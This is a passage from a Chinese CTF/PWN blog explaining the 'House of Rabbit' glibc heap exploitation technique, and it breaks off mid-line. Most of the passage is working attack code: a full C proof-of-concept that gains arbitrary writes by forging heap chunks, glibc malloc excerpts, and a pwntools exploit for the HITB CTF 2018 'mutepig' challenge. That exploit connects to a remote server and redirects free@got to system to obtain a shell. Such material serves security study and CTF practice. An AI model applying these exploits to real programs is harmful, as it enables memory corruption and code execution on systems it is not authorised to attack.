class="built_in">memcpy</span>(buf+<span class="number">12</span>,&amp;bk,<span class="number">4</span>);</span><br><span class="line">    size=<span class="number">248</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;buf[<span class="number">248</span>],&amp;size,<span class="number">4</span>);</span><br><span class="line">    buf[252]='\x00';</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">memcpy</span>(p1,buf,<span class="number">253</span>);</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个DEMO中使用了一个指向堆上的指针ptr，ptr是全局变量处于bss段上。通过重复写ptr值即可实现write-anything-anywhere。</p>

      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-10-21T06:01:10.114Z"><a href="/2018/10/21/hor/">2018-10-21</a></time>
      
      
  
    <h1 class="title"><a href="/2018/10/21/hor/">House-Of-Rabbit</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="House-Of-Rabbit-原理"><a href="#House-Of-Rabbit-原理" class="headerlink" title="House Of Rabbit 原理"></a>House Of Rabbit 原理</h1><ul>
<li><a href="http://p4nda.top/tags/CTF/" target="_blank" rel="noopener">CTF</a></li>
<li><a href="http://p4nda.top/tags/PWN/" target="_blank" rel="noopener">PWN</a></li>
</ul>
<p>House Of Rabbit是一个比较新的堆利用姿势，在满足条件的情况下，可以绕过堆块的地址随机化保护（ASLR）达到<strong>任意</strong>地址分配的目的。</p>
<h1 id="所需条件"><a href="#所需条件" class="headerlink" title="所需条件"></a>所需条件</h1><ol>
<li>可以分配任意大小的堆块并且释放，主要包括三类fastbin大小的堆块、smallbin大小的堆块、较大的堆块（用于分配到任意地址处）</li>
<li>存在一块已知地址的内存空间，并可以任意写至少<strong>0x20</strong>长度的字节</li>
<li>存在fastbin dup、UAF等漏洞，用于劫持fastbin的fd指针。</li>
</ol>
<p>当存在上述三个条件时，即可使用House Of Rabbit攻击方法，Rabbit的含义大概是可以JUMP到任意地址（日本人的冷幽默？？）</p>
<h1 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h1><h2 id="使用样例"><a href="#使用样例" class="headerlink" title="使用样例"></a>使用样例</h2><p>在<a href="https://github.com/shift-crops/House_of_Rabbit/blob/master/house_of_rabbit.c" target="_blank" rel="noopener">此处</a>有可以使用的样例文件，来自 <a href="https://github.com/shift-crops" target="_blank" rel="noopener">shift-crops</a> ，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">   PoC of House of Rabbit</span><br><span class="line">   Tested in Ubuntu 14.04, 16.04 (64bit).</span><br><span class="line">   </span><br><span class="line">   Yutaro Shimizu</span><br><span class="line">   @shift_crops</span><br><span class="line">   2017/09/14</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">char target[0x10] = &quot;Hello, World!&quot;;</span><br><span class="line">unsigned long gbuf[6] = &#123;0&#125;;</span><br><span class="line"></span><br><span class="line">int main(void)&#123;</span><br><span class="line">	void *p, *fast, *small, *fake;</span><br><span class="line">	char *victim;</span><br><span class="line"></span><br><span class="line">	printf(	&quot;This is PoC of House of Rabbit\n&quot;</span><br><span class="line">		&quot;This technique bypassing Heap ASLR without leaking address, &quot;</span><br><span class="line">		&quot;and make it possible to overwrite a variable located at an arbitary address.\n&quot;</span><br><span class="line">		&quot;Jump like a rabbit and get an accurate address by malloc! :)\n\n&quot;);</span><br><span class="line"></span><br><span class="line">	// 1. Make &apos;av-&gt;system_mem &gt; 0xa00000&apos;</span><br><span class="line">	printf(&quot;1. Make &apos;av-&gt;system_mem &gt; 0xa00000&apos;\n&quot;);</span><br><span class="line">	p = malloc(0xa00000);</span><br><span class="line">	printf(&quot;  Allocate 0xa00000 byte by mmap at %p, and free.\n&quot;, p);</span><br><span class="line">	free(p);</span><br><span class="line"></span><br><span class="line">	p = malloc(0xa00000);</span><br><span class="line">	printf(&quot;  Allocate 0xa00000 byte in heap at %p, and free.\n&quot;, p);</span><br><span class="line">	free(p);</span><br><span class="line">	printf(&quot;  Then, the value of &apos;av-&gt;system_mem&apos; became larger than 0xa00000.\n\n&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	// 2. Free fast chunk and link to fastbins</span><br><span class="line">	printf(&quot;2. Free fast chunk and link to fastbins\n&quot;);</span><br><span class="line">	fast = malloc(0x10); 		// any size in fastbins is ok </span><br><span class="line">	small = malloc(0x80);</span><br><span class="line">	printf(	&quot;  Allocate fast chunk and small chunk.\n&quot;</span><br><span class="line">		&quot;  fast = %p\n&quot;</span><br><span class="line">		&quot;  small = %p\n&quot;, fast, small);</span><br><span class="line">	free(fast);</span><br><span class="line">	printf(&quot;  Free fast chunk.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	// 3. Make fake_chunk on .bss</span><br><span class="line">	printf(&quot;3. Make fake_chunk on .bss\n&quot;);</span><br><span class="line">	gbuf[1] = 0x11;	</span><br><span class="line">	gbuf[3] = 0xfffffffffffffff1;	</span><br><span class="line">	printf(	&quot;  fake_chunk1 (size : 0x%lx) is at %p\n&quot;</span><br><span class="line">		&quot;  fake_chunk2 (size : 0x%lx) is at %p\n\n&quot;</span><br><span class="line">		, gbuf[3], &amp;gbuf[2], gbuf[1], &amp;gbuf[0]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	// VULNERABILITY</span><br><span class="line">	// use after free or fastbins dup etc...</span><br><span class="line">	fake = &amp;gbuf[2];</span><br><span class="line">	printf(	&quot;VULNERABILITY (e.g. UAF)\n&quot;</span><br><span class="line">		&quot;  *fast = %p\n&quot;</span><br><span class="line">		, fake);</span><br><span class="line">	*(unsigned long**)fast = fake;</span><br><span class="line">	printf(&quot;  fastbins list : [%p, %p, %p]\n\n&quot;, fast-0x10, fake, *(void **)(fake+0x10));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	// 4. call malloc_consolidate</span><br><span class="line">	printf(	&quot;4. call malloc_consolidate\n&quot;</span><br><span class="line">		&quot;  Free the small chunk (%p) next to top, and link fake_chunk1(%p) to unsorted bins.\n\n&quot;</span><br><span class="line">		, small, fake);</span><br><span class="line">	free(small);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	// 5. Link unsorted bins to appropriate list</span><br><span class="line">	printf(	&quot;5. Link unsorted bins to appropriate list\n&quot;</span><br><span class="line">		&quot;  Rewrite fake_chunk1&apos;s size to 0xa0001 to bypass &apos;size &lt; av-&gt;system_mem&apos; check.\n&quot;);</span><br><span class="line">	gbuf[3] = 0xa00001;</span><br><span class="line">	malloc(0xa00000);</span><br><span class="line">	printf(	&quot;  Allocate huge chunk.\n&quot;</span><br><span class="line">		&quot;  Now, fake_chunk1 link to largebin[126](max).\n&quot;</span><br><span class="line">		&quot;  Then, write fake_chunk1&apos;s size back to 0xfffffffffffffff1.\n\n&quot;);</span><br><span class="line">	gbuf[3] = 0xfffffffffffffff1;	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	// 6. Overwrite targer variable</span><br><span class="line">	printf(	&quot;6. Overwrite targer variable on .data\n&quot;</span><br><span class="line">		&quot;  target is at %p\n&quot;</span><br><span class="line">		&quot;  Before : %s\n&quot;</span><br><span class="line">		, &amp;target, target);</span><br><span class="line"></span><br><span class="line">	malloc((void*)&amp;target-(void*)(gbuf+2)-0x20);</span><br><span class="line">	victim = malloc(0x10);</span><br><span class="line">	printf(&quot;  Allocate 0x10 byte at %p, and overwrite.\n&quot;, victim);</span><br><span class="line">	strcpy(victim, &quot;Hacked!!&quot;);</span><br><span class="line"></span><br><span class="line">	printf(&quot;  After  : %s\n&quot;, target);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面对这个利用方法进行分步解析</p>
<h2 id="步骤1-增大malloc函数中-mmap分配阈值"><a href="#步骤1-增大malloc函数中-mmap分配阈值" class="headerlink" title="步骤1 增大malloc函数中 mmap分配阈值"></a>步骤1 增大malloc函数中 mmap分配阈值</h2><p>当通过malloc函数分配内存时，当超过某特定阈值时，堆块会由mmap来分配，但同时会改变该阈值。具体改变和分配代码如下：</p>
<p>分配代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) </span><br><span class="line">   &amp;&amp;(mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br><span class="line">   &#123;</span><br><span class="line">      ……</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>阈值改变：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unsigned long sum;</span><br><span class="line">sum = atomic_exchange_and_add (&amp;mp_.mmapped_mem, size) + size;</span><br><span class="line">atomic_max (&amp;mp_.max_mmapped_mem, sum);</span><br></pre></td></tr></table></figure>
<p>因此在第一阶段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 1. Make &apos;av-&gt;system_mem &gt; 0xa00000&apos;</span><br><span class="line">printf(&quot;1. Make &apos;av-&gt;system_mem &gt; 0xa00000&apos;\n&quot;);</span><br><span class="line">p = malloc(0xa00000);</span><br><span class="line">printf(&quot;  Allocate 0xa00000 byte by mmap at %p, and free.\n&quot;, p);</span><br><span class="line">free(p);</span><br><span class="line"></span><br><span class="line">p = malloc(0xa00000);</span><br><span class="line">printf(&quot;  Allocate 0xa00000 byte in heap at %p, and free.\n&quot;, p);</span><br><span class="line">free(p);</span><br><span class="line">printf(&quot;  Then, the value of &apos;av-&gt;system_mem&apos; became larger than 0xa00000.\n\n&quot;);</span><br></pre></td></tr></table></figure>
<p>第一次程序malloc(0xa00000)时，堆块由mmap分配，并且mp_.max_mmaped_mem变成0xa10000，当free以后再次malloc(0xa00000)时，系统会首先通过sbrk扩大top块进行分配，当最后一次free后，top大小变成0xa20c31 &gt; 0xa00000</p>
<p><a href="http://p4nda.top/img/house_of_rabbit/1.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/house_of_rabbit/1.png" alt="img"></a></p>
<h2 id="步骤2-申请小堆块并放入fastbin"><a href="#步骤2-申请小堆块并放入fastbin" class="headerlink" title="步骤2 申请小堆块并放入fastbin"></a>步骤2 申请小堆块并放入fastbin</h2><p>首先malloc(0x20) ，再次malloc(0x80)，这两块都是由top直接切割得到，保证small bin大小的块挨着top。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 2. Free fast chunk and link to fastbins</span><br><span class="line">printf(&quot;2. Free fast chunk and link to fastbins\n&quot;);</span><br><span class="line">fast = malloc(0x20); 		// any size in fastbins is ok </span><br><span class="line">small = malloc(0x80);</span><br><span class="line">printf(	&quot;  Allocate fast chunk and small chunk.\n&quot;</span><br><span class="line">	&quot;  fast = %p\n&quot;</span><br><span class="line">	&quot;  small = %p\n&quot;, fast, small);</span><br><span class="line">free(fast);</span><br><span class="line">printf(&quot;  Free fast chunk.\n\n&quot;);</span><br></pre></td></tr></table></figure>
<p>此时，对应的堆结构是：</p>
<p><a href="http://p4nda.top/img/house_of_rabbit/2.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/house_of_rabbit/2.png" alt="img"></a></p>
<h2 id="步骤3-伪造堆块并劫持至fastbin"><a href="#步骤3-伪造堆块并劫持至fastbin" class="headerlink" title="步骤3 伪造堆块并劫持至fastbin"></a>步骤3 伪造堆块并劫持至fastbin</h2><p>在一个已知地址的内存处（如未开启PIE的程序BSS段）伪造两个连续的堆块，一个堆块大小是0x11，紧挨着是0xfffffffffffffff1，这样可以保证后续操作可以覆盖到任意地址。更重要的是这个0x11的小块即是大块的前块，也是大块的后块，可以保证在malloc中通过检查。</p>
<p>利用漏洞劫持fastbin，将大小为0xfffffffffffffff1的堆块，挂到fastbin上去。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// 3. Make fake_chunk on .bss</span><br><span class="line">printf(&quot;3. Make fake_chunk on .bss\n&quot;);</span><br><span class="line">gbuf[1] = 0x11;	</span><br><span class="line">gbuf[3] = 0xfffffffffffffff1;	</span><br><span class="line">printf(	&quot;  fake_chunk1 (size : 0x%lx) is at %p\n&quot;</span><br><span class="line">	&quot;  fake_chunk2 (size : 0x%lx) is at %p\n\n&quot;</span><br><span class="line">	, gbuf[3], &amp;gbuf[2], gbuf[1], &amp;gbuf[0]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// VULNERABILITY</span><br><span class="line">// use after free or fastbins dup etc...</span><br><span class="line">fake = &amp;gbuf[2];</span><br><span class="line">printf(	&quot;VULNERABILITY (e.g. UAF)\n&quot;</span><br><span class="line">	&quot;  *fast = %p\n&quot;</span><br><span class="line">	, fake);</span><br><span class="line">*(unsigned long**)fast = fake;</span><br><span class="line">printf(&quot;  fastbins list : [%p, %p, %p]\n\n&quot;, fast-0x10, fake, *(void **)(fake+0x10));</span><br></pre></td></tr></table></figure>
<p>此时，堆块状态如下：</p>
<p><a href="http://p4nda.top/img/house_of_rabbit/3.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/house_of_rabbit/3.png" alt="img"></a></p>
<h2 id="步骤4-利用malloc-consolidate使伪造堆块进入unsorted-bin"><a href="#步骤4-利用malloc-consolidate使伪造堆块进入unsorted-bin" class="headerlink" title="步骤4 利用malloc_consolidate使伪造堆块进入unsorted bin"></a>步骤4 利用malloc_consolidate使伪造堆块进入unsorted bin</h2><p>在free函数中，当释放的块大于 65536时，会触发malloc_consolidate，这个函数用于对fastbin合并，并放到unsorted bin中。</p>
<p>触发代码如下：(malloc.c 4071)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#define FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      if (have_fastchunks(av))</span><br><span class="line">		malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>而在malloc_consolidate()中，会循环处理各fastbin堆块，当堆块与top相邻时，与top合并。否则，将堆块放入unsorted bin中，并设置pre_size和pre_inuse位，此时较小的堆块变成 0xffffffffffffffff0 0x10</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">if (nextchunk != av-&gt;top) &#123;</span><br><span class="line">  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">  if (!nextinuse) &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    unlink(av, nextchunk, bck, fwd);</span><br><span class="line">  &#125; else</span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, 0);</span><br><span class="line"></span><br><span class="line">  first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">  unsorted_bin-&gt;fd = p;</span><br><span class="line">  first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">  if (!in_smallbin_range (size)) &#123;</span><br><span class="line">    p-&gt;fd_nextsize = NULL;</span><br><span class="line">    p-&gt;bk_nextsize = NULL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  p-&gt;bk = unsorted_bin;</span><br><span class="line">  p-&gt;fd = first_unsorted;</span><br><span class="line">  set_foot(p, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else &#123;</span><br><span class="line">  size += nextsize;</span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  av-&gt;top = p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对应步骤代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 4. call malloc_consolidate</span><br><span class="line">printf(	&quot;4. call malloc_consolidate\n&quot;</span><br><span class="line">	&quot;  Free the small chunk (%p) next to top, and link fake_chunk1(%p) to unsorted bins.\n\n&quot;</span><br><span class="line">	, small, fake);</span><br><span class="line">free(small);</span><br></pre></td></tr></table></figure>
<p>步骤结束后，内存分布如下：</p>
<p><a href="http://p4nda.top/img/house_of_rabbit/4.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/house_of_rabbit/4.png" alt="img"></a></p>
<h2 id="步骤5-分配内存-使伪造堆块进入large-bin"><a href="#步骤5-分配内存-使伪造堆块进入large-bin" class="headerlink" title="步骤5 分配内存 使伪造堆块进入large bin"></a>步骤5 分配内存 使伪造堆块进入large bin</h2><p>当伪造的堆块进入unsorted bin时，并不能达到目的，需要进一步使堆块进入large bin，此时需要将伪造的堆块大小改为0xa00001，其目的有两个，1是绕过程序对unsorted bin中内存块大小小于av-&gt;system_mem的检测；2是使程序放入large bin的最后一块（&gt;0x800000)</p>
<p>malloc检测如下（malloc.c 3473）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">for (;; )</span><br><span class="line">   &#123;</span><br><span class="line">     int iters = 0;</span><br><span class="line">     while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">       &#123;</span><br><span class="line">         bck = victim-&gt;bk;</span><br><span class="line">         if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0)</span><br><span class="line">             || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0))</span><br><span class="line">           malloc_printerr (check_action, &quot;malloc(): memory corruption&quot;,</span><br><span class="line">                            chunk2mem (victim), av);</span><br><span class="line">         size = chunksize (victim);</span><br></pre></td></tr></table></figure>
<p>步骤代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 5. Link unsorted bins to appropriate list</span><br><span class="line">	printf(	&quot;5. Link unsorted bins to appropriate list\n&quot;</span><br><span class="line">		&quot;  Rewrite fake_chunk1&apos;s size to 0xa00001 to bypass &apos;size &lt; av-&gt;system_mem&apos; check.\n&quot;);</span><br><span class="line">	gbuf[3] = 0xa00001;</span><br><span class="line">	malloc(0xa00000);</span><br><span class="line">	printf(	&quot;  Allocate huge chunk.\n&quot;</span><br><span class="line">		&quot;  Now, fake_chunk1 link to largebin[126](max).\n&quot;</span><br><span class="line">		&quot;  Then, write fake_chunk1&apos;s size back to 0xfffffffffffffff1.\n\n&quot;);</span><br><span class="line">	gbuf[3] = 0xfffffffffffffff1;</span><br></pre></td></tr></table></figure>
<p>最终，程序的堆块布局如下：</p>
<p><a href="http://p4nda.top/img/house_of_rabbit/5.png" target="_blank" rel="noopener"><img src="http://p4nda.top/img/house_of_rabbit/5.png" alt="img"></a></p>
<h2 id="步骤6-任意内存分配"><a href="#步骤6-任意内存分配" class="headerlink" title="步骤6 任意内存分配"></a>步骤6 任意内存分配</h2><p>当伪造堆块进入large bin最后一个队列时，将伪造堆块的大小改回0xfffffffffffffff1，此时在申请任意长度的地址，使堆块地址上溢到当前堆地址的低地址位置，从而可以分配到任意地址，达到内存任意写的目的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 6. Overwrite targer variable</span><br><span class="line">printf(	&quot;6. Overwrite targer variable on .data\n&quot;</span><br><span class="line">	&quot;  target is at %p\n&quot;</span><br><span class="line">	&quot;  Before : %s\n&quot;</span><br><span class="line">	, &amp;target, target);</span><br><span class="line"></span><br><span class="line">malloc((void*)&amp;target-(void*)(gbuf+2)-0x20);</span><br><span class="line">victim = malloc(0x10);</span><br><span class="line">printf(&quot;  Allocate 0x10 byte at %p, and overwrite.\n&quot;, victim);</span><br><span class="line">strcpy(victim, &quot;Hacked!!&quot;);</span><br><span class="line"></span><br><span class="line">printf(&quot;  After  : %s\n&quot;, target);</span><br></pre></td></tr></table></figure>
<h1 id="相关题目"><a href="#相关题目" class="headerlink" title="相关题目"></a>相关题目</h1><h2 id="HITB-CTF-2018-mutepig"><a href="#HITB-CTF-2018-mutepig" class="headerlink" title="HITB CTF 2018 mutepig"></a>HITB CTF 2018 mutepig</h2><p>题目提供分配大小为0x10、0x80、0xa00000、0xffffffffffffff70大小的堆块，并且没有开启PIE保护，还存在UAF漏洞，完全满足该利用方法需求，通过将内存地址分配回bss段低地址部分的堆地址指针数组，覆写数组内容为free@got，利用编辑功能，将其内容改为system@plt，在free时可以拿到shell。</p>
<p>坑点在于此题没有输出，调试比较坑。另外需要注意<strong>利用方法</strong>中提到的当大堆块释放到unsorted bin时，小堆块的值会有改动。</p>
<p><strong>EXP</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">import time</span><br><span class="line">debug = 0</span><br><span class="line">elf=ELF(&apos;mutepig&apos;)</span><br><span class="line"></span><br><span class="line">if debug:</span><br><span class="line">	p = process(&apos;./mutepig&apos;)</span><br><span class="line">	libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">	context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">	p = remote(&apos;47.75.128.158&apos;, 9999)</span><br><span class="line">	#libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line">	context.log_level = &apos;debug&apos;</span><br><span class="line">	#libc = ELF(&apos;./libc-2.23.so&apos;)</span><br><span class="line">	#off = 0x001b0000</span><br><span class="line">def add(type,content):</span><br><span class="line">	p.sendline(&apos;1&apos;)</span><br><span class="line">	p.sendline(str(type))</span><br><span class="line">	p.send(content)</span><br><span class="line">	time.sleep(1)</span><br><span class="line">def free(index):</span><br><span class="line">	p.sendline(&apos;2&apos;)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,content1,content2):</span><br><span class="line">	p.sendline(&apos;3&apos;)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">	p.send(content1)</span><br><span class="line">	p.send(content2)</span><br><span class="line">	time.sleep(1)</span><br><span class="line"></span><br><span class="line">bss_list = 0x06020C0</span><br><span class="line">bss_can_be_edit = 0x602120</span><br><span class="line">add(3,&apos;p4nda_0&apos;) #0</span><br><span class="line">free(0)</span><br><span class="line">add(3,&apos;p4nda_1&apos;) #1</span><br><span class="line">free(1)</span><br><span class="line">add(1,&apos;p4nda_2&apos;) #2</span><br><span class="line">add(2,&apos;p4nda_3&apos;) #3</span><br><span class="line">free(2)</span><br><span class="line">edit(2,p64(bss_can_be_edit+0x10)[:-1],p64(0)+p64(0x11)+p64(0)+p64(0xfffffffffffffff1)+&apos;\0&apos;*15)</span><br><span class="line">free(3)</span><br><span class="line">edit(2,p64(0)[:-1],p64(0)+p64(0x11)+p64(0)+p64(0xA00001))</span><br><span class="line">add(3,&apos;p4nda_4&apos;) #4</span><br><span class="line">edit(2,p64(bss_can_be_edit+0x10)[:-1],p64(0xfffffffffffffff0)+p64(0x10)+p64(0)+p64(0xfffffffffffffff1))</span><br><span class="line">#</span><br><span class="line">add(0x3419,&apos;p4nda_5&apos;) #5</span><br><span class="line">add(1,p64(elf.got[&apos;free&apos;])[:-1])</span><br><span 